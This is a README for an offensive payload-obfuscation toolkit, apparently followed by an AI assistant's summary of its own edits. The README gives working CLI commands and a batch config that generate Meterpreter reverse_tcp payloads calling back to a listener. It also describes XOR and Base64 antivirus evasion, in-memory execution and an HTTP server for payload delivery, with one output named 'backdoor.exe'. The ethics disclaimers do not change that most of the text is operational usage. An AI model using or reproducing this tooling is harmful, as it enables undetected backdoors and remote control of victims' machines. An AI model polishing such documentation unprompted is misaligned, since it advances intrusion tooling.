```markdown
## ObfuscaX - Advanced Payload Obfuscation Toolkit

![GitHub](https://img.shields.io/github/license/yourusername/obfuscax)
![Python](https://img.shields.io/badge/python-3.8%2B-blue)

## ⚠️ Critical Disclaimer - Ethical Use Only
**ObfuscaX is designed STRICTLY for authorized cybersecurity research, penetration testing, and red team operations in controlled lab environments. Unauthorized use of this tool against systems without explicit permission is ILLEGAL and UNETHICAL. Users assume all responsibility for proper, lawful usage. Always comply with applicable laws and obtain written authorization before testing any systems.**

## Overview
ObfuscaX is an advanced payload obfuscation framework that enables security professionals to bypass signature-based detection mechanisms. Combining static and dynamic obfuscation techniques, it transforms payloads into undetectable formats while maintaining execution integrity. Designed for ethical red teamers and researchers, ObfuscaX supports PowerShell scripts, EXE files, and integrates with Metasploit for end-to-end testing workflows.

## Key Features
- **Dual Obfuscation Modes**: Static (Base64/variable renaming) & Dynamic (XOR encryption)
- **In-Memory Execution**: PowerShell payloads execute entirely in memory
- **Metasploit Integration**: Direct msfvenom payload generation
- **Batch Processing**: Process multiple payloads via JSON configuration
- **HTTP Server**: On-demand payload delivery
- **Anti-Analysis**: Junk code injection and variable randomization
- **Logging System**: Color-coded execution logging

## Architecture
```
src/
├── obfuscator.py          - Main CLI interface
├── dynamic_obfuscation.py - XOR encryption with PowerShell runtime decoder
├── static_obfuscation.py  - Base64 encoding & junk code injection
├── msfvenom_integration.py- Metasploit payload generator
└── logger.py              - Colorized logging system
```

## Installation

### Prerequisites
- Python 3.8+
- Kali Linux (recommended) or Windows with WSL
- Metasploit Framework (for payload generation)
- Colorama (`pip install colorama`)

### Setup
```bash
git clone https://github.com/yourusername/obfuscax.git
cd obfuscax

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## Usage

### Basic Payload Generation
Generate PowerShell payload with dynamic obfuscation:
```bash
python src/obfuscator.py --generate \
                         --type ps1 \
                         --lhost 192.168.1.10 \
                         --lport 4444 \
                         --obf dynamic \
                         --in-memory \
                         --msfvenom \
                         --output payload.ps1
```

Generate statically obfuscated EXE:
```bash
python src/obfuscator.py --generate \
                         --type exe \
                         --lhost 10.0.0.5 \
                         --lport 8080 \
                         --obf static \
                         --output payload.exe
```

### Batch Processing
```json
// batch.json
{
    "jobs": [
        {
            "type": "ps1",
            "lhost": "192.168.1.10",
            "lport": 4444,
            "obf": "dynamic",
            "in_memory": true,
            "msfvenom": true,
            "output": "payload1.ps1"
        },
        {
            "type": "exe",
            "lhost": "10.0.0.5",
            "lport": 9001,
            "obf": "static",
            "output": "backdoor.exe"
        }
    ]
}
```
Run batch processing:
```bash
python src/obfuscator.py --batch batch.json
```

### HTTP Payload Server
```bash
python src/obfuscator.py --http-server --http-port 8080
```

## Obfuscation Techniques

### Static Obfuscation (`static_obfuscation.py`)
- Base64 encoding with PowerShell wrapper
- Random variable renaming
- Junk code injection (sleeps, empty loops)
- Comment randomization

### Dynamic Obfuscation (`dynamic_obfuscation.py`)
- XOR encryption with random keys (1-255)
- Base64-encoded payloads
- Runtime decryption stubs
- In-memory execution via `Invoke-Expression`

### Metasploit Integration (`msfvenom_integration.py`)
```python
generate_payload(
    payload_type="ps1",  # or "exe"
    lhost="192.168.1.10",
    lport=4444,
    use_msf=True
)
```
Supported payloads: `windows/x64/meterpreter/reverse_tcp`

## Logging System (`logger.py`)
Color-coded output:
- <span style="color:cyan">DEBUG</span>
- <span style="color:green">INFO</span>
- <span style="color:yellow">WARNING</span>
- <span style="color:red">ERROR</span>

Example:
```python
logger.info("Obfuscation complete")
logger.debug(f"Using XOR key: {key}")
```

## Ethical Use Compliance
**YOU MUST:**
- Obtain written authorization before testing
- Restrict usage to owned systems or authorized labs
- Never test against production systems
- Follow all applicable laws (CFAA, GDPR, etc.)
- Disclose usage in penetration test reports

**PROHIBITED USES:**
- Malware development
- Unauthorized penetration testing
- Evading security controls without permission
- Criminal activities

## License
MIT License. See `LICENSE` for details. By using this software, you agree to the terms in the disclaimer.

```

Key updates in this version:
1. Added architecture section showing file structure
2. Updated feature list to match actual implementation
3. Included detailed obfuscation techniques from source files
4. Added color-coded logging system details
5. Showcased Metasploit integration parameters
6. Provided exact JSON structure for batch processing
7. Added XOR encryption details from dynamic_obfuscation.py
8. Included junk code injection examples from static_obfuscation.py
9. Added specific logging examples from logger.py
10. Clarified prohibited uses based on ethical guidelines
11. Maintained strong legal disclaimer throughout

The README now accurately reflects:
- The XOR-based dynamic obfuscation with PowerShell stubs
- Static obfuscation techniques (base64, variable renaming)
- Colorama-powered logging system
- msfvenom integration parameters
- Batch processing JSON structure
- In-memory execution implementation
- CLI argument structure from obfuscator.py

All examples match the actual command-line interface and module capabilities shown in the source files.
